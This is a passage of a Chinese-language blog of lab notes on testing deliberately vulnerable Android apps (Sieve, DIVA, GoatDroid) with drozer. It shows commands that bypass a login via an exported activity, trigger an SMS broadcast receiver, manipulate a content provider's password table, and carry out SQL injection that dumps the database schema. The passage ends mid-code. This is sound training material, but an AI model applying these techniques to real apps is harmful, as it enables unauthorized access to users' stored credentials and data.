</span></span><span style=display:flex><span>dz&gt; run scanner.provider.sqltables -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning jakhar.aseem.diva...
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  notes
</span></span><span style=display:flex><span>  sqlite_sequence
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://jakhar.aseem.diva.provider.notesprovider/notes:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  notes
</span></span><span style=display:flex><span>  sqlite_sequence
</span></span></code></pre></div></li></ul></li></ol></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/>Test Sieve - activities exported</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><ul><li>Drozer Seive - <a href=https://labs.withsecure.com/tools/drozer#3.1>官網</a>, <a href=https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/sieve.apk>Download</a><blockquote><p>Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.</p></blockquote></li></ul><h1 id=test-sieve---activities-exported>Test Sieve - activities exported
<a class=anchor href=#test-sieve---activities-exported>#</a></h1><p>參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞</p><ol><li>起手式-確認基本資訊<pre tabindex=0><code class=language-bash! data-lang=bash!>dz&gt; run app.package.list -f Sieve # 確認該App的package name
Attempting to run shell module
com.mwr.example.sieve (Sieve)

dz&gt; run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊
Attempting to run shell module
Package: com.mwr.example.sieve
  Application Label: Sieve
  Process Name: com.mwr.example.sieve
  Version: 1.0
  Data Directory: /data/user/0/com.mwr.example.sieve
  APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk
  UID: 10285
  GID: [3003]
  Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar]
  Shared User ID: null
  Uses Permissions:
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.WRITE_EXTERNAL_STORAGE
  - android.permission.INTERNET
  - android.permission.POST_NOTIFICATIONS
  - android.permission.ACCESS_MEDIA_LOCATION
  - android.permission.READ_MEDIA_AUDIO
  - android.permission.READ_MEDIA_VIDEO
  - android.permission.READ_MEDIA_IMAGES
  Defines Permissions:
  - com.mwr.example.sieve.READ_KEYS
  - com.mwr.example.sieve.WRITE_KEYS

dz&gt; run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示
...

dz&gt; run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些
Attempting to run shell module
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable
</code></pre>看攻擊面的左邊就是該攻擊點有幾個</li><li>activities exported<ol><li>列出exported activities有哪些<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.activity.info -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: com.mwr.example.sieve
</span></span><span style=display:flex><span>  com.mwr.example.sieve.FileSelectActivity
</span></span><span style=display:flex><span>    Permission: null
</span></span><span style=display:flex><span>  com.mwr.example.sieve.MainLoginActivity
</span></span><span style=display:flex><span>    Permission: null
</span></span><span style=display:flex><span>  com.mwr.example.sieve.PWList
</span></span><span style=display:flex><span>    Permission: null
</span></span></code></pre></div></li><li>啟動activity<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
</span></span></code></pre></div>此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass
![Screenshot_20240603-163856](<a href=https://hackmd.io/_uploads/rkrr-ZsNA.png>https://hackmd.io/_uploads/rkrr-ZsNA.png</a> =200x)</li></ol></li></ol><h1 id=reference>Reference
<a class=anchor href=#reference>#</a></h1><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://blog.csdn.net/samlirongsheng/article/details/104926282>drozer之玩轉sieve</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/>...</a></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/>Test Sieve - broadcast receivers exported</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=test-sieve---broadcast-receivers-exported>Test Sieve - broadcast receivers exported
<a class=anchor href=#test-sieve---broadcast-receivers-exported>#</a></h1><p>這個就不是用Sieve做示範，因為這個App沒有match的receiver</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.broadcast.info -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: com.mwr.example.sieve
</span></span><span style=display:flex><span>  No matching receivers.
</span></span></code></pre></div><p>所以我就用之前安裝的goatdroid做示範</p><ol><li>檢查broadcast receiver<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: org.owasp.goatdroid.fourgoats
</span></span><span style=display:flex><span>  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
</span></span><span style=display:flex><span>    Permission: null
</span></span></code></pre></div></li><li>確認後就逆向看一下
在<code>org.owasp.goatdroid.fourgoats.broadcastreceivers</code>中有SendSMSNowReceiver這個class，內容如下:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SendSMSNowReceiver</span> <span style=color:#66d9ef>extends</span> BroadcastReceiver {
</span></span><span style=display:flex><span>    Context context;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.content.BroadcastReceiver</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>onReceive</span>(Context arg0, Intent arg1) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>context</span> <span style=color:#f92672>=</span> arg0;
</span></span><span style=display:flex><span>        SmsManager sms <span style=color:#f92672>=</span> SmsManager.<span style=color:#a6e22e>getDefault</span>();
</span></span><span style=display:flex><span>        Bundle bundle <span style=color:#f92672>=</span> arg1.<span style=color:#a6e22e>getExtras</span>();
</span></span><span style=display:flex><span>        sms.<span style=color:#a6e22e>sendTextMessage</span>(bundle.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;phoneNumber&#34;</span>), <span style=color:#66d9ef>null</span>, bundle.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;message&#34;</span>), <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>        Utils.<span style=color:#a6e22e>makeToast</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>context</span>, Constants.<span style=color:#a6e22e>TEXT_MESSAGE_SENT</span>, 1);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Send Something
此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有<code>org.owasp.goatdroid.fourgoats.SOCIAL_SMS</code>這個action才會被接收，並且觸發onReceive這個function<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;manifest</span> <span style=color:#a6e22e>versionCode=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>versionName=</span><span style=color:#e6db74>&#34;1.0&#34;</span> <span style=color:#a6e22e>package=</span><span style=color:#e6db74>&#34;org.owasp.goatdroid.fourgoats&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;application</span> <span style=color:#a6e22e>theme=</span><span style=color:#e6db74>&#34;@2131361870&#34;</span> <span style=color:#a6e22e>label=</span><span style=color:#e6db74>&#34;@2131296266&#34;</span> <span style=color:#a6e22e>icon=</span><span style=color:#e6db74>&#34;@2130837632&#34;</span> <span style=color:#a6e22e>debuggable=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;receiver</span> <span style=color:#a6e22e>label=</span><span style=color:#e6db74>&#34;Send SMS&#34;</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;.broadcastreceivers.SendSMSNowReceiver&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;intent-filter&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;org.owasp.goatdroid.fourgoats.SOCIAL_SMS&#34;</span><span style=color:#f92672>&gt;&lt;/action&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/intent-filter&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/receiver&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/application&gt;</span>
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/manifest&gt;</span>
</span></span></code></pre></div><pre tabindex=0><code class=language-bash! data-lang=bash!>dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message &#34;Hello mate!&#34;
</code></pre>因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用</li></ol></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/>Test Sieve - content providers exported - DB Based</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=test-sieve---content-providers-exported---db-based>Test Sieve - content providers exported - DB Based
<a class=anchor href=#test-sieve---content-providers-exported---db-based>#</a></h1><p>如果想知道實際的狀況和content URI是什麼，可以參考<a href=https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d>ChatGPT的說明</a></p><ol><li>起手式
從以下command的結果可以知道<code>com.mwr.example.sieve.DBContentProvider</code>和<code>com.mwr.example.sieve.FileBackupProvider</code>的狀況，並且從結果可以知道URI的形式長怎樣<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span></code></pre></div>:::spoiler<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.info -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: com.mwr.example.sieve
</span></span><span style=display:flex><span>  Authority: com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>    Read Permission: null
</span></span><span style=display:flex><span>    Write Permission: null
</span></span><span style=display:flex><span>    Content Provider: com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>    Multiprocess Allowed: True
</span></span><span style=display:flex><span>    Grant Uri Permissions: False
</span></span><span style=display:flex><span>    Uri Permission Patterns:
</span></span><span style=display:flex><span>    Path Permissions:
</span></span><span style=display:flex><span>      Path: /Keys
</span></span><span style=display:flex><span>        Type: PATTERN_LITERAL
</span></span><span style=display:flex><span>        Read Permission: com.mwr.example.sieve.READ_KEYS
</span></span><span style=display:flex><span>        Write Permission: com.mwr.example.sieve.WRITE_KEYS
</span></span><span style=display:flex><span>  Authority: com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>    Read Permission: null
</span></span><span style=display:flex><span>    Write Permission: null
</span></span><span style=display:flex><span>    Content Provider: com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>    Multiprocess Allowed: True
</span></span><span style=display:flex><span>    Grant Uri Permissions: False
</span></span><span style=display:flex><span>    Uri Permission Patterns:
</span></span><span style=display:flex><span>    Path Permissions:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/Keys
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For sure accessible content URIs:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span></code></pre></div>:::</li><li>逆向
實際去看<code>DBContentProvider</code>這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.content.ContentProvider</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>onCreate</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>pwdb</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PWDBHelper(getContext());
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sUriMatcher</span>.<span style=color:#a6e22e>addURI</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.DBContentProvider&#34;</span>, PWTable.<span style=color:#a6e22e>TABLE_NAME</span>, 100);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sUriMatcher</span>.<span style=color:#a6e22e>addURI</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.DBContentProvider&#34;</span>, <span style=color:#e6db74>&#34;Keys&#34;</span>, KEY);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)</li><li>query/insert/update/delete/sqli<ul><li>query<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#Simple Query</span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span></code></pre></div></li><li>insert
根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id <span style=color:#ae81ff>2</span> --string password bbb --string email aaa@bbb.com
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span> service  null
</span></span><span style=display:flex><span>username  null
</span></span><span style=display:flex><span>password  bbb
</span></span><span style=display:flex><span>   email  aaa@bbb.com
</span></span></code></pre></div></li><li>update
_id=2的data，被我們改掉了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selection-args <span style=color:#ae81ff>2</span> --string password ccc --string email ddd@eee.com
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span> service  null
</span></span><span style=display:flex><span>username  null
</span></span><span style=display:flex><span>password  ccc
</span></span><span style=display:flex><span>   email  ddd@eee.com
</span></span></code></pre></div></li><li>delete
只剩下最一開始我們設定的data<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selection-args <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span></code></pre></div></li><li>sqli
如下結果所示，的確存在sqli，並且可以得到完整的table<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 先嘗試丟一些trash byte</span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span style=color:#e6db74>&#34;&#39;&#34;</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Exception occured: unrecognized token: <span style=color:#e6db74>&#34;&#39;)&#34;</span> <span style=color:#f92672>(</span>code <span style=color:#ae81ff>1</span> SQLITE_ERROR<span style=color:#f92672>)</span>: , <span style=color:#66d9ef>while</span> compiling: SELECT * FROM Passwords WHERE <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection &#34;* FROM SQLITE_MASTER WHERE type=&#39;</span>table<span style=color:#960050;background-color:#1e0010>&#39;</span>;--<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Attempting to run shell module
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| type  | name             | tbl_name         | rootpage | sql                                                                                              |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
</span></span></span></code></pre></div>我們也可以用drozer自動幫我們找<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run scanner.provider.injection -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>Not Vulnerable:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.FileBackupProvider/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Projection:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Selection:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.sqltables -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  Passwords
</span></span><span style=display:flex><span>  Key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  Passwords
</span></span><span style=display:flex><span>  Key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  Passwords
</span></span><span style=display:flex><span>  Key
</span></span></code></pre></div></li></ul></li></ol></p></article><article class="markdown book-post"><h2><a href=/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/>Test Sieve - content providers exported - File SystemBased</a></h2><div class=text-small><a href=/tags/android/>Android</a>,
<a href=/tags/drozer/>Drozer</a></div><p><h1 id=test-sieve---content-providers-exported---file-systembased>Test Sieve - content providers exported - File SystemBased
<a class=anchor href=#test-sieve---content-providers-exported---file-systembased>#</a></h1><ol><li>有關於基於File System的Content Provider - 逆向
在<code>com.mwr.example.sieve.FileBackupProvider</code>中可以特別注意onCreate以及ParcelFileDescriptor這個funnction<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileBackupProvider</span> <span style=color:#66d9ef>extends</span> ContentProvider {
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.content.ContentProvider</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>onCreate</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sUriMatcher</span>.<span style=color:#a6e22e>addURI</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.FileBackupProvider&#34;</span>, <span style=color:#e6db74>&#34;*&#34;</span>, DATABASE);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.content.ContentProvider</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ParcelFileDescriptor <span style=color:#a6e22e>openFile</span>(Uri uri, String mode) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> modeCode;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (mode.<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;r&#34;</span>)) {
</span></span><span style=display:flex><span>            modeCode <span style=color:#f92672>=</span> 268435456;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (mode.<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;rw&#34;</span>)) {
</span></span><span style=display:flex><span>            modeCode <span style=color:#f92672>=</span> 805306368;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (mode.<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;rwt&#34;</span>)) {
